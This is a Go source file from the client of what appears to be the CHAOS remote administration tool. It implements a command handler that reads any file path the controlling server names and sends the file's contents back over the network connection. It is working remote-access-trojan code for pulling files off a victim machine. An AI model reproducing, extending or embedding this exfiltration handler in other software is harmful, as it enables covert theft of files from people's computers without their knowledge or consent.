package download

import (
	"encoding/json"
	log "github.com/sirupsen/logrus"
	"github.com/tiagorlampert/CHAOS/client/app/models"
	"github.com/tiagorlampert/CHAOS/client/app/usecase"
	"github.com/tiagorlampert/CHAOS/client/app/util/network"
	"github.com/tiagorlampert/CHAOS/client/app/util/os"
	"net"
)

type DownloadUseCase struct {
	Connection net.Conn
}

func NewDownloadUseCase(conn net.Conn) usecase.Download {
	return &DownloadUseCase{
		Connection: conn,
	}
}

func (d DownloadUseCase) File(data []byte) {
	var download models.Download
	if err := json.Unmarshal(data, &download); err != nil {
		log.WithField("cause", err.Error()).Error("error decoding download")
	}

	var errMsg models.Error
	file, err := os.ReadFile(download.Filepath)
	if err != nil {
		log.WithField("cause", err.Error()).Error("error reading file")
		errMsg.HasError = true
		errMsg.Message = err.Error()
	}

	if err = network.Send(d.Connection, models.Message{
		Command: "download",
		Data:    file,
		Error:   errMsg,
	}); err != nil {
		log.WithField("cause", err.Error()).Error("error sending file")
	}
}
